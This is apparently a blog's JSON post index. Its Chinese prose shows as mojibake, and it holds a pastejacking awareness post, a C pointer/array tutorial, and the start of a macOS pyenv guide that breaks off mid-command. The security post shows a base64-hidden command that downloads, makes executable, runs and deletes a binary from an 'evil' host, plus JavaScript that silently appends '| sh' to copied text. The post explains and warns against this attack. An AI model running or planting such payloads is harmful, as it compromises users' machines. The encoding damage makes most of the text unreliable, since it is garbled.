:)`\n\nå¦‚æœæˆ‘å°‡å€‹æŒ‡ä»¤æ”¾åœ¨ä¸€äº›é¡¯çœ¼çš„åœ°æ–¹åƒæ˜¯ç¶²ç«™çš„è‡ªæˆ‘ä»‹ç´¹ã€èªªæ˜æ¬„ï¼Œæˆ‘ç›¸ä¿¡æœ‰äº›å…·æœ‰å¥½å¥‡å¿ƒçš„è®€è€…å¯èƒ½å°±æœƒå‚»å‚»åŸ·è¡Œã€‚ä½†æ˜¯ä¸€äº›å…·æœ‰ç¶“é©—çš„è®€è€…é‚„æ˜¯æœƒç™¼ç¾å¥å°¾å¸¶çš„é‚£å€‹ `sh`ï¼Œè€Œä¸å»åŸ·è¡Œå®ƒã€‚\n\né‚£æˆ‘å¦‚æœæ”¹æˆé€™æ¨£å‘¢ï¼Ÿ\n\n```bash\necho \"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d\n```\n\né€™æ¨£å­æˆ‘ç›¸ä¿¡ 9 æˆä»¥ä¸Šçš„äººï¼ˆåŒ…å«æˆ‘è‡ªå·±ï¼‰ï¼Œéƒ½æœƒæƒ³æŠŠé€™æ®µæŒ‡ä»¤è²¼ä¸Šå»åŸ·è¡Œçœ‹ä¸€ä¸‹çµæœç‚ºä½•ï¼Œç•¢ç«Ÿå°±æ˜¯ä¸€æ¢å–®ç´”çš„è§£ç¢¼æŒ‡ä»¤ï¼Œæ€éº¼å¯èƒ½æœ‰å®³ï¼Ÿ\n\nä½†æ˜¯åˆ¥å¿˜äº†ï¼Œæƒ¡æ„æ”»æ“Šè€…å¯ä»¥åœ¨ç¶²é ä¸­çš„ JS æ’å…¥ï¼š\n\n```javascript\nconst source = document.querySelector('div.source') //æŒ‡ä»¤å€å¡Š\nsource.addEventListener('copy', (event) => {\n    const selection = document.getSelection()\n    event.clipboardData.setData('text/plain', selection.toString() + '| sh')\n    event.preventDefault()\n})\n```\n\nè©²ç¨‹å¼ç¢¼çš„æ„æ€ç‚ºç•¶ä½ è¤‡è£½å­—ä¸²æ™‚ï¼Œè‡ªå‹•å°‡å‰ªè²¼æ¿ä¸­çš„å­—ä¸²æœ«ç«¯åŠ ä¸Š `| sh`ï¼Œæ„æ€å°±æ˜¯ä½ è¤‡è£½åˆ°çš„å­—ä¸²å…¶å¯¦æ˜¯ï¼š\n\n```bash\necho \"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==\" | base64 -d | sh\n```\n\nå¦‚æœä½ è²¼ä¸Š terminal ä¹‹å¾Œæ²’æœ‰æª¢æŸ¥å°±ç›´æ¥æŒ‰ä¸‹ enterï¼Œé‚£éº¼ä½ çš„é›»è…¦å°±ä¸çŸ¥ä¸è¦ºçš„åŸ·è¡Œäº†ä¸€å€‹åŸ·è¡Œæª”è€Œä½ å®Œå…¨æ²’æœ‰æ„Ÿè¦ºã€‚\n\næƒ³æƒ³çœ‹ï¼Œå¦‚æœåœ¨é–‹ç™¼è€…çš„éƒ¨è½æ ¼è‡ªæˆ‘ä»‹ç´¹ï¼Œæ”¾å…¥é€™ç¨®æŒ‡ä»¤å¼çš„è‡ªæˆ‘ä»‹ç´¹æ˜¯ä¸æ˜¯å¾ˆæœ‰è¶£ï¼Ÿæˆ–æ˜¯æ”¾åœ¨è‡‰æ›¸çš„è‡ªæˆ‘ä»‹ç´¹ï¼Ÿç•¶ä½ å¾ˆé–‹å¿ƒçš„è²¼ä¸ŠæŒ‡ä»¤æ™‚ï¼Œå¾ˆå¯èƒ½é»˜é»˜ä¸­äº†äººå®¶çš„å¾Œé–€ç¨‹å¼ã€‚\n\n## æœ€å¾Œ\n\nè©²æ–‡ç« çš„é‡é»ç„¡éé‚„æ˜¯æé†’å¹¾é»è³‡å®‰çš„æ„è­˜ï¼š\n\n- ä¾†è·¯ä¸æ˜çš„æŒ‡ä»¤ä¸è¦è²¼ä¸Šçµ‚ç«¯æ©ŸåŸ·è¡Œ\n- ä¸è¦ç›¸ä¿¡å‰ªè²¼æ¿çš„å…§å®¹ï¼ŒæŒ‰ä¸‹ Enter åŸ·è¡Œå‰æ‡‰è©²è‚‰çœ¼å†åº¦æª¢æŸ¥ä¸€æ¬¡æŒ‡ä»¤\n\næœ€å¾Œæé†’å¤§å®¶ï¼Œåœ¨æœªç¶“åŒæ„ä¸‹å…¥ä¾µä»–äººé›»è…¦æ˜¯æœ‰åˆ‘è²¬çš„ï¼Œä¸è¦ä»¥èº«è©¦æ³•ï¼","tags":["è³‡è¨Šå®‰å…¨"]},{"title":"é‡æ–°çœ‹æ‡‚æŒ‡æ¨™èˆ‡é™£åˆ—ä¹‹é–“çš„äº¤äº’é—œä¿‚","url":"/2020/02/15/","content":"\nC èªè¨€ä¸­ï¼ŒæŒ‡æ¨™èˆ‡é™£åˆ—ä¹‹é–“çš„é—œä¿‚ä¸€ç›´æ˜¯ä¸€å€‹åˆå­¸è€…å¾ˆé›£ç†è§£çš„å‘ã€‚åˆæˆ–æ˜¯å¾ˆå¤šäººåªçŸ¥é“å¯«æ³•ï¼Œä½†å»å¾ä¾†æ²’æœ‰ç†è§£éèƒŒå¾Œçš„åŸå› ã€‚ç›¸ä¿¡å„ä½ç†è§£äº†åŸå› ä¹‹å¾Œï¼Œåœ¨æ’°å¯« C èªè¨€æ™‚æœƒå°è‡ªå·±æ“ä½œé€™å€‹èªè¨€æ›´åŠ æœ‰è‡ªä¿¡ã€‚é€™ç¯‡æ–‡ç« é‡æ–°è©¦è‘—é‡æ¸…é€™æŒ‡æ¨™èˆ‡é™£åˆ—ä¹‹é–“çš„é—œä¿‚ï¼Œå¸Œæœ›å°å¤§å®¶èƒ½æœ‰å¹«åŠ©ã€‚\n\n## é™£åˆ—å®£å‘Šèˆ‡æŒ‡æ¨™å®£å‘Š\n\né™£åˆ—å¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼å®£å‘Šï¼š\n\n1. å®£å‘Šä½†æ˜¯å°šæœªåˆå§‹åŒ–\n```c\nint arr_init0[3]; // å®£å‘Šä½†æ˜¯å°šæœªåˆå§‹åŒ–ï¼Œæ­¤æ™‚é™£åˆ—ä¸­çš„å€¼æ˜¯æ²’æœ‰æ„ç¾©çš„ã€‚\n```\n2. å®£å‘Šä¸¦ä¸”åˆå§‹åŒ–\n```c\nint arr_init1[3] = {1, 2, 3};\n```\n3. ä¸æŒ‡å®šå¤§å°ï¼Œå¤§å°æœƒä¾ç…§å¾Œé¢å…ƒç´ å€‹æ•¸ä¾†æ±ºå®š\n```c\nint arr_init2[] = {1, 2, 3};\n```\n4. C99 æ–°å¢ã€‚æŒ‡å®šç‰¹å®šå…ƒç´ ï¼Œå…¶ä»–æœªè¢«æŒ‡å®šå…ƒç´ æœƒè¢«è¨­å®šç‚º 0\n```c\nint arr_init3[] = {[2] = 2};\n```\n---\næŒ‡æ¨™çš„å®£å‘Šï¼Œéœ€è¦é—œéµå­— `*`ï¼Œè©²é—œéµå­—å¯ä»¥ç·Šé„°è®Šæ•¸æˆ–æ˜¯å‹æ…‹ï¼Œæœ¬è³ªä¸Šæ²’æœ‰å·®åˆ¥ï¼š\n```c\nint* ptr1;\nint *ptr2;\n```\nä½†è‹¥æ˜¯æˆ‘å€‘å®£å‘ŠæŒ‡æ¨™å»ä¸æŒ‡å®šåˆå§‹å€¼ï¼Œé€™ä»¶äº‹æ˜¯éå¸¸å±éšªçš„ï¼\n```c\nint *ptr1;\nprintf(\"%p\\n\", ptr1); // 0x1125ce025\n```\n\nè©²æŒ‡æ¨™åœ¨æœªå®£å‘Šçš„æƒ…æ³ä¸‹ï¼Œç·¨è­¯å™¨æœƒç›´æ¥æŒ‡å®šè©²ä½ç½®ä¸Šæœ¬ä¾†å°±å­˜æœ‰çš„å€¼ï¼ˆé€™å€‹å€¼æ²’æœ‰æ„ç¾©ï¼Œæ˜¯ä½œæ¥­ç³»çµ±æ®˜ç•™çš„å€¼ï¼‰ï¼Œå¦‚æœæ²’æœ‰ç‰¹åˆ¥æ³¨æ„ï¼Œæ“ä½œé€™å€‹ä½ç½®æœƒç™¼ç”ŸéŒ¯èª¤ï¼Œç”šè‡³è¦†å¯«åˆ°éœ€è¦çš„è³‡æ–™ã€‚\n\næˆ‘å€‘æœƒå»ºè­°æŒ‡æ¨™åœ¨å®£å‘Šæ™‚é‚„æ²’æœ‰ç‰¹å®šçš„ç©ºé–“æˆ–ä½ç½®å¯ä»¥æŒ‡å®šæ™‚ï¼Œå…ˆä½¿ç”¨ `NULL` ä¾†æŒ‡å®šã€‚\n\n```c\nint *ptr = NULL;\nprintf(\"%p\\n\", ptr); //0x0\n```\n\n## é™£åˆ—ç´¢å¼•èˆ‡æŒ‡æ¨™\n\né™£åˆ—çš„è®Šæ•¸åç¨±å…¶å¯¦å°±æ˜¯ä¸€å€‹æŒ‡æ¨™ï¼ŒæŒ‡å‘é™£åˆ—é–‹é ­å…ƒç´ çš„è¨˜æ†¶é«”ä½ç½®ã€‚é€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼é™£åˆ—ç´¢å¼•æœƒå¾ 0 é–‹å§‹è¨ˆç®—ï¼Œå› ç‚ºç´¢å¼•çš„æ„ç¾©å…¶å¯¦æ˜¯èˆ‡èµ·å§‹ä½ç½®çš„ä½ç§»é‡ã€‚æˆ‘å€‘å¯ä»¥ç”¨ä»¥ä¸‹ç¯„ä¾‹çœ‹åˆ°èµ·å§‹ä½ç½®çš„å€¼å°±æ˜¯ç›´æ¥å°é™£åˆ—åç¨±å–å€¼ï¼ˆdereferenceï¼‰ã€‚\n```c\nint arr[3] = {1, 2, 3};\nprintf(\"Address: %p, Value: %d\\n\", arr, *arr);\n// Address: 0x7ffee98be05c, Value: 1\n```\nå¦‚æœå°è©²è®Šæ•¸éå¢ï¼Œæœƒç™¼ç¾è¨˜æ†¶é«”ä½ç½®ç›¸å·®äº† 4 æ ¼ï¼ŒåŸå› æ˜¯å› ç‚ºæˆ‘å€‘åœ¨å®£å‘Šé™£åˆ—æ™‚ï¼ŒæŒ‡å®šäº†é™£åˆ—çš„å‹æ…‹æ˜¯ `int`ï¼Œå¦‚æ­¤ä»¥ä¾†æˆ‘å€‘åœ¨é€²è¡Œå–å€¼çš„å‹•ä½œæ™‚ï¼ŒCPU æ‰çŸ¥é“ä¸‹ä¸€å€‹ä½ç½®åœ¨å“ªé‚Šã€‚æœ‰è¶£çš„æ˜¯ï¼Œä¸€èˆ¬æˆ‘å€‘æ‰€ä½¿ç”¨çš„å–å€¼å‹•ä½œ `arr[1]` å…¶å¯¦å°±ç­‰æ–¼ `*(arr + 1)`ã€‚\n\n```c\nprintf(\"Address: %p, Value: %d\\n\", arr + 1, *(arr + 1));\n// Address: 0x7ffee1dca060, Value: 2\n```\n\næœ‰äº†ä»¥ä¸Šçš„æ¦‚å¿µä¹‹å¾Œï¼Œä¸é›£ç†è§£ç‚ºä½•æˆ‘å€‘åœ¨è¨­å®šå‡½æ•¸çš„åƒæ•¸å¼•è¿°æ™‚ï¼Œå¯ä»¥å°‡é™£åˆ—è¨­å®šç‚ºï¼š\n```c\nvoid foo(int *arr);\n```\n\næˆ–æ˜¯é€™æ¨£è¨­å®šï¼š\n\n```c\nvoid foo(int arr[]);\n```\n\né€™å…©ç¨®æŒ‡å®šæ–¹å¼æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼ˆå°æ–¼ç·¨è­¯å™¨ä¾†èªªï¼‰ã€‚åœ¨å‡½å¼åŸå‹ä¸­ï¼Œåƒæ•¸çš„åç¨±æ˜¯æ²’æœ‰æ„ç¾©çš„ï¼Œåªæœ‰å‹æ…‹æœ‰æ„ç¾©ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æŒ‡å®šç‚ºï¼š\n```c\nvoid foo(int *);\n```\n\nä½†æ˜¯é™£åˆ—åç¨±èˆ‡æŒ‡æ¨™ä¹Ÿä¸èƒ½èªªæ˜¯å®Œå…¨ä¸€æ¨¡ä¸€æ¨£çš„æ±è¥¿ã€‚\n\n## é™£åˆ—å‚³éèˆ‡æŒ‡æ¨™\n\nåœ¨ C èªè¨€ä¸­ï¼Œå‚³éé™£åˆ—å°±æ˜¯å‚³éé™£åˆ—çš„èµ·å§‹è¨˜æ†¶é«”ä½ç½®ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥ç”¨æŒ‡æ¨™ä¾†æ¥æ”¶é™£åˆ—ï¼š\n```c\n#include <stdio.h>\n\nvoid foo(int *);\n\nint main() {\n    int arr[3] = {1, 2, 3};\n    printf(\"%lu\\n\", sizeof arr); // 12\n    foo(arr);\n}\n\nvoid foo(int *ar) {\n    printf(\"%lu\\n\", sizeof ar); // 8\n}\n```\nä»¥ä¸Šç¨‹å¼æœƒå°å‡ºï¼š\n```\n12\n8\n```\nå…ˆå°å‡º 12 çš„åŸå› æ˜¯ï¼Œé™£åˆ—åœ¨å®£å‘Šæ™‚å°±å·²ç¶“çŸ¥é“äº†é™£åˆ—é•·åº¦ï¼Œint å‹æ…‹åœ¨æˆ‘çš„ä½œæ¥­ç³»çµ±ä¸­ä½”ç”¨äº† 4 bytesï¼Œæ‰€ä»¥ 4x3=12ã€‚\n\n8 çš„è©±å‰‡æ˜¯ä»£è¡¨æŒ‡æ¨™è®Šæ•¸æœ¬èº«ä½”æ“šäº† 8 bytes çš„ç©ºé–“ã€‚éå¸¸åˆç†ï¼Œå› ç‚ºæˆ‘çš„é›»è…¦æ˜¯ 64-bit çš„ä½œæ¥­ç³»çµ±ï¼Œè¦å¯ä»¥å®Œæ•´å®šå€å…¨éƒ¨ç©ºé–“éœ€è¦ 8 bytesï¼ˆ64 / 8 = 8ï¼‰ã€‚\n\næ‰€ä»¥ç‚ºä»€éº¼å‰›æ‰æåˆ°ï¼šã€Œé™£åˆ—åç¨±èˆ‡æŒ‡æ¨™ä¹Ÿä¸èƒ½èªªæ˜¯å®Œå…¨ä¸€æ¨¡ä¸€æ¨£çš„æ±è¥¿ã€ã€‚ç”¨ `sizeof` é€²è¡Œæ“ä½œæ™‚ï¼Œæœƒç™¼ç¾å…©è€…é‚„æ˜¯æœ‰ä¸€é»å·®åˆ¥ï¼ï¼ˆä¸éåœ¨æ²’æœ‰é€²è¡Œåƒæ•¸å‚³éå‰ï¼Œå¹¾ä¹æ˜¯æ²’æœ‰å·®åˆ¥çš„ã€‚ï¼‰\n\nç”±ä»¥ä¸Šçš„ä¾‹å­å¯ä»¥ç™¼ç¾ï¼Œé™£åˆ—çš„è®Šæ•¸åç¨±å¯ä»¥é€²ä¸€æ­¥å¾—çŸ¥é™£åˆ—é•·åº¦çš„ï¼Œåªè¦ä½¿ç”¨ `sizeof` é‹ç®—å­å³å¯ï¼š\n```c\nint arr[3] = {1, 2, 3};\nint len = sizeof arr / sizeof arr[0];\nprintf(\"%d\\n\", len); //3\n```\n`sizeof` å¾Œé¢å¦‚æœä¸æ˜¯æ¥åŸºæœ¬å‹æ…‹ï¼Œæ˜¯ä¸éœ€è¦æ‹¬è™Ÿçš„ã€‚å¦‚æœæ¥ä¸ŠåŸºæœ¬å‹æ…‹æ‰éœ€è¦æ‹¬è™Ÿï¼Œåƒæ˜¯ï¼š\n\n```c\nprintf(\"%lu\\n\", sizeof(char));   //1\nprintf(\"%lu\\n\", sizeof(short));  //2\nprintf(\"%lu\\n\", sizeof(int));    //4\nprintf(\"%lu\\n\", sizeof(long));   //8\n//è«‹æ³¨æ„ï¼ä¸åŒå‹æ…‹çš„ç©ºé–“å¤§å°æ˜¯ç”±ç·¨è­¯å™¨ä¾ç…§ä½œæ¥­ç³»çµ±å»åˆ†é…ä»¥åŠå¯¦ä½œï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¸åŒé›»è…¦ä¸Šé¢çš„çµæœä¸ä¸€è‡´ã€‚\n```\n\nå°æ–¼å‡½å¼ä¾†èªªï¼Œå®ƒåªæœ‰è¾¦æ³•å¾—çŸ¥é™£åˆ—èµ·å§‹è¨˜æ†¶é«”ä½ç½®ï¼Œç„¡æ³•å¾—çŸ¥ç¸½é•·åº¦ã€‚æˆ–æ˜¯å¯ä»¥ç›´æ¥èªªï¼Œå°æ–¼å‡½æ•¸ä¾†èªªï¼Œä»–ä¸¦ä¸çŸ¥é“å‚³é€²ä¾†çš„æ±è¥¿æ˜¯ä¸€å€‹é™£åˆ—ï¼ŒåªçŸ¥é“æ˜¯ä¸€å€‹è¨˜æ†¶é«”ä½ç½®ï¼ŒæŒ‡å‘çš„å‹æ…‹ä¹ŸçŸ¥é“ï¼Œå…¶ä»–äº‹æƒ…å°æ–¼é€™å€‹å‡½æ•¸ä¾†èªªéƒ½ç„¡æ³•å¾—çŸ¥ã€‚\n\né€™ä¹Ÿæ˜¯ç‚ºä½•æˆ‘å€‘æ™‚å¸¸åœ¨æ¥æ”¶é™£åˆ—æ™‚ï¼Œæœƒé¡å¤–æ¥æ”¶ä¸€å€‹åƒæ•¸ï¼Œç”¨ä¾†è¡¨ç¤ºé™£åˆ—çš„ç¸½é•·åº¦ã€‚\n\n```c\nvoid foo(int *arr, int n);\n```\n\n## äºŒç¶­é™£åˆ—\n\nåœ¨å®£å‘Šä¸€ç¶­é™£åˆ—æ™‚ï¼Œå¯ä»¥ç›´æ¥å¡«ä¸Šå…ƒç´ ï¼Œä¸æŒ‡å®šé™£åˆ—å¤§å°ï¼Œå¯æ˜¯åœ¨äºŒç¶­é™£åˆ—é€™æ¨£æ“ä½œçš„è©±ï¼Œæœƒç™¼ç”ŸéŒ¯èª¤ï¼š\n```c\nint td_arr[][] = {{1, 2}, {3, 4}, {5, 6}};\n\n/*\napp.c:7:12: error: array has incomplete element type 'int []'\n        int td_arr[][] = {{1, 2}, {3, 4}, {5, 6}};\n                  ^\n1 error generated.\n*/\n```\næˆ‘å€‘è¦å…ˆé‡æ–°ç†è§£äºŒç¶­é™£åˆ—ï¼ŒäºŒç¶­é™£åˆ—ä¸éæ˜¯ä¸€å€‹é™£åˆ—ï¼Œè©²é™£åˆ—çš„å€¼ä¹Ÿæ˜¯ä¸€å€‹é™£åˆ—ï¼ˆ`{1, 2}`, `{3, 4}`, `{5, 6}`ï¼‰ï¼Œæ²’æœ‰å¤šç‰¹åˆ¥ï¼Œåƒ…æ­¤è€Œå·²ã€‚\n\né™£åˆ—åªæ¥å—ç¬¬ä¸€å±¤ä¸æŒ‡å®šå¤§å°è€Œå·²ï¼Œç”¨å¾Œé¢çš„å…ƒç´ å€‹æ•¸è‡ªå·±æ¨ç®—ï¼ˆä¸€ç¶­é™£åˆ—åªæœ‰ä¸€å±¤ï¼Œæ‰€ä»¥ä½ å¯èƒ½æœƒèªç‚ºä¸€ç¶­é™£åˆ—æ¯”è¼ƒè°æ˜ï¼‰ã€‚\n\næ‰€ä»¥æˆ‘å€‘æ‡‰è©²è¦å‘Šè¨´ç·¨è­¯å™¨ï¼Œå…§å±¤é™£åˆ—çš„å¤§å°ï¼Œé€™æ¨£ä»–æ‰æœ‰è¾¦æ³•å¹«æˆ‘å€‘å°‡æ‰€éœ€è¦çš„ç©ºé–“æº–å‚™å¥½ï¼Œæˆ‘å€‘æ‡‰è©²é€™æ¨£å­æ’°å¯«ç¨‹å¼ï¼š\n```c\nint td_arr[][2] = {{1, 2}, {3, 4}, {5, 6}};\n```\n\nç¬¬ä¸€å±¤æœ‰å¹¾å€‹å…ƒç´ å¯ä»¥ä¸ç”¨æŒ‡å®šï¼ˆå°±åƒä¸€ç¶­é™£åˆ—ï¼‰ï¼Œä½†æ˜¯æˆ‘å€‘éœ€è¦å‘Šè¨´ç·¨è­¯å™¨ï¼Œå…§å®¹é™£åˆ—çš„å¯¬åº¦æœ‰å¤šå¤§ã€‚æˆ‘å€‘ç¸½å…±èŠ±äº† 24 bytes çš„ç©ºé–“ï¼Œ4 bytes(int size) x 6(elements) = 24ã€‚\n\næ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å˜—è©¦å°‡äºŒç¶­é™£åˆ—ä¸­æˆ‘å€‘éœ€è¦çš„å€¼å–å‡ºï¼š\n```c\nprintf(\"%d\\n\", *td_arr[1]);  //3\nprintf(\"%d\\n\", (*td_arr)[1]);//2\n```\n\n`[]` çš„å„ªå…ˆæ¬Šæ¯” `*` é‚„è¦é«˜ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€å€‹ç¯„ä¾‹ä¸­æˆ‘å€‘æœƒå…ˆæ‰¾åˆ° `td_arr` ä¸­çš„ç¬¬äºŒå€‹å…ƒç´ ï¼ˆç¬¬ 1 å€‹æ˜¯ç´¢å¼• 0ï¼‰ç„¶å¾Œå–å€¼ã€‚ç¬¬äºŒå€‹å…ƒç´ å°±æ˜¯ `{3, 4}`ï¼Œåœ¨æ–‡ç« å‰æ®µçš„ä¸€ç¶­é™£åˆ—æœ‰è¬›éç›´æ¥å–å€¼å°±æ˜¯å°ç¬¬ä¸€å€‹å…ƒç´ ï¼ˆç´¢å¼• 0ï¼‰å–å€¼ã€‚æ‰€ä»¥ `{3, 4}` çš„ç¬¬ä¸€å€‹å…ƒç´ å°±æ˜¯ `3`ã€‚\n\nç¬¬äºŒå€‹ç¯„ä¾‹å‰‡æ˜¯å…ˆå–å€¼ï¼Œæˆ‘å€‘æœƒæ‹¿åˆ° `td_arr` çš„ç¬¬ 1 å€‹å…ƒç´ ï¼ˆç´¢å¼• 0ï¼‰ï¼Œä¹Ÿå°±æ˜¯ `{1, 2}` æ¥ä¸‹ä¾†å–å‡ºç¬¬äºŒå€‹å…ƒç´ ï¼ˆç´¢å¼• 1ï¼‰ï¼Œå¾—åˆ° `2`ã€‚\n\nä¹Ÿå¯ä»¥å°‡ä¸Šè¿°å¯«æˆæ˜¯ä¸å«æœ‰ `[]` çš„è¡¨ç¤ºæ³•ï¼Œå¦‚ä¸‹ï¼š\n```c\nprintf(\"%d\\n\", **(td_arr + 1));//3\nprintf(\"%d\\n\", *(*td_arr + 1));//2\n```\n\nå‰é¢æ®µè½ä¹Ÿæœ‰æåˆ° `[]` èˆ‡ `*(arr + offset)` çš„å¯«æ³•å¯ä»¥äº’ç›¸æ›¿æ›ï¼Œå°±ä¸å†è´…è¿°ã€‚\n\n## æŒ‡æ¨™èˆ‡äºŒç¶­é™£åˆ—\n\næ¥ä¸‹ä¾†æˆ‘å€‘è¦ç†è§£å¦‚ä½•ç”¨æŒ‡æ¨™å»æ“ä½œäºŒç¶­é™£åˆ—ï¼Œé¦–å…ˆæˆ‘å€‘éœ€è¦å…ˆå®£å‘Šä¸€å€‹æŒ‡å‘äºŒç¶­é™£åˆ—çš„æŒ‡æ¨™ï¼š\n\n```c\nint (*td_ptr)[2];\n```\n\nè©²å®£å‘Šçš„æ„æ€æ˜¯å®£å‘Šä¸€å€‹æŒ‡æ¨™ï¼ŒæŒ‡å‘å¤§å°ç‚º 2 çš„é™£åˆ—ï¼Œè©²é™£åˆ—å…§å®¹ç‚º `int` å‹æ…‹ã€‚\n\nç‚ºä½•ä¸ç›´æ¥å¯«ï¼š\n\n```c\nint *td_ptr[2]; // å¯ä»¥çœ‹æˆ int *(td_ptr[2]);\n```\n\nåŸå› æ˜¯å› ç‚ºå„ªå…ˆæ¬Šå¸¶ä¾†çš„å½±éŸ¿ä¸¦ä¸åŒï¼ˆ`[]` çš„å„ªå…ˆæ¬Šè¼ƒå¤§ï¼‰ï¼Œä»¥ä¸Šå®£å‘Šçš„æ„æ€æ˜¯ç”¢ç”Ÿä¸€å€‹å¤§å°ç‚º 2 çš„é™£åˆ—ï¼Œé™£åˆ—å…§å®¹æ˜¯å…©å€‹æŒ‡å‘ `int` çš„æŒ‡æ¨™ã€‚å¦‚ä¸‹ï¼š\n\n`{ptr1, ptr2}`\n\nå®£å‘Šå®ŒæŒ‡æ¨™ä¹‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥å°‡è©²æŒ‡æ¨™ï¼ŒæŒ‡å‘æˆ‘å€‘çš„äºŒç¶­é™£åˆ—ï¼š\n```c\nint td_arr[][2] = {{1, 2}, {3, 4}, {5, 6}};\nint (*td_ptr)[2];\ntd_ptr = td_arr;\n```\n\næ¥è‘—ä¸€æ¨£å¯ä»¥ç”¨æŒ‡æ¨™ä¾†æ“ä½œè©²é™£åˆ—ï¼š\n```c\nprintf(\"%d\\n\", td_ptr[2][0]); //5\nprintf(\"%d\\n\", td_ptr[2][1]); //6\n```\n\nå¦‚æœéœ€è¦è¨­å®šå‡½æ•¸åŸå‹çš„è©±ï¼š\n```c\nvoid foo(int (*ar)[2]);\n```\næˆ–æ˜¯ï¼š\n```c\nvoid foo(int arr[][2]);\n```\nçš†å¯ä»¥ç”¨ä¾†æ¥æ”¶ã€‚\n\næˆ‘æƒ³çœ‹åˆ°é€™é‚Šï¼Œå¦‚æœä½ æ²’æœ‰å…¶ä»–ç–‘å•çš„è©±ã€‚æ‡‰è©²å¯ä»¥ç¨å¾®ç†è§£ç‚ºä½•æˆ‘å€‘åœ¨å‚³éäºŒç¶­é™£åˆ—æ™‚ï¼Œæœƒä½¿ç”¨é€™æ¨£å­çš„å¯«æ³•äº†ï¼é€™æ¨£å­ç†è§£çš„è©±ä¹Ÿå¯ä»¥æ¨å»£åˆ°å¤šç¶­é™£åˆ—ä¸­ï¼Œåƒæ˜¯ï¼š\n\n```c\nvoid foo(int arr[][2][3][4][5][6]);\nvoid foo(int (*arr)[2][3][4][5][6]);\n```\n\n## å¾Œè¨˜\n\nå¸Œæœ›é€™ç¯‡æ–‡ç« å¯ä»¥è®“å¤§å®¶æ›´åŠ ç†è§£ C èªè¨€é™£åˆ—èˆ‡æŒ‡æ¨™æ’°å¯«éç¨‹ä¸­çš„èƒŒæ™¯åŸå› ï¼Œåœ¨ç¶²è·¯ä¸Šçœ‹åˆ°å¤ªå¤šæ–‡ç« åªæœ‰æåˆ°å®£å‘Šæˆ–æ˜¯ä½¿ç”¨çš„æ–¹å¼ï¼Œä½†æ˜¯å»æ²’æœ‰åŠ ä»¥æè¿°ä»»ä½•åŸå› ï¼Œå°è‡´å¾ˆå¤šäººåªçŸ¥é“å¯«æ³•ä½†ä¸æ¸…æ¥šç‚ºä½•æ‡‰è©²é€™æ¨£å­æ’°å¯«ã€‚\n\nå¸Œæœ›å¤§å®¶çœ‹å®Œæ–‡ç« æœ‰æ‰€æ”¶ç©« ğŸ˜„ï¼","tags":["c"]},{"title":"å„ªé›…çš„åœ¨ macOS ä¸Šä½¿ç”¨ Python","url":"/2020/01/11/","content":"\n## ç‚ºä»€è¦è¦é€™æ¨£åšï¼Ÿ\n\næˆ‘å€‘éƒ½çŸ¥é“ macOS æœ‰ Pythonï¼Œç‚ºäº†ä¸å°‡é è¨­çš„ç’°å¢ƒå¼„é«’ã€‚æ¯”è¼ƒæ¨è–¦çš„åšæ³•æ˜¯é€é `pyenv` é€™å¥— Python ç‰ˆæœ¬ç®¡ç†å·¥å…·ä¾†å®‰è£ä¸åŒçš„ Python ç‰ˆæœ¬ï¼Œå¦‚æ­¤ä¸€ä¾†è¦åˆ‡æ›ä¸åŒçš„ç‰ˆæœ¬ä¹Ÿæ–¹ä¾¿ï¼Œç•¢ç«Ÿé‚„æ˜¯æœ‰å¾ˆå¤šå°ˆæ¡ˆæ˜¯ç”¨ Python2 åœ¨ç¶­è­·ã€‚\n\nå¦‚æœä½ æ²’æœ‰ä½¿ç”¨ä¸åŒçš„ Python ç‰ˆæœ¬éœ€æ±‚ä¹Ÿå¯ä»¥ç„¡è¦–é€™ç¯‡ï¼Œä½†æ˜¯å»ºè­°è‡³å°‘ç”¨ `virtualenv` ä¾†é–‹ç™¼å°ˆæ¡ˆï¼Œæ‰ä¸æœƒæŠŠå…§å»ºçš„ Python ç’°å¢ƒå¼„æˆä¸€åœ˜äº‚ã€‚\n\n## æª¢æŸ¥ç›®å‰ç‰ˆæœ¬\n\nç›®å‰æˆ‘çš„ macOS çš„ Python æ˜¯é è¨­çš„ Pythonï¼š\n\n`which python`\n```\n/usr/bin/python\n```\n`python                                                       `\n```\nWARNING: Python 2.7 is not recommended.\nThis version is included in macOS for compatibility with legacy software.\nFuture versions of macOS will not include Python 2.7.\nInstead, it is recommended that you transition to using 'python3' from within Terminal.\n\nPython 2.7.16 (default, Nov  9 2019, 05:55:08)\n[GCC 4.2.1 Compatible Apple LLVM 11.0.0 (clang-1100.0.32.4) (-macos10.15-objc-s on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>>\n```\n\n## ç”¨ pyenv ä¾†ç®¡ç† Python ç‰ˆæœ¬\n\né¦–å…ˆï¼Œå…ˆå®‰è£ pyenvï¼š\n\n`brew install pyenv`\n\nå®‰è£å®Œç•¢å¾Œç¢ºèªè‡ªå·±çš„ç’°å¢ƒè®Šæ•¸ï¼š\n\n`echo $PATH`\n```\n/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n```\n\n### åˆå§‹è¨­å®šè¨­å®š\n\n`~/.zshrc` è«‹è‡ªè¡Œæ›¿æ›æˆä½ çš„ shell çš„è¨­å®šæª”ä½ç½®ï¼ˆbash çš„è©±æ˜¯ `~/.bash_profile`ï¼‰ï¼š\n\n`echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\\n  eval \"$(pyenv init -)\"\\nfi' >> 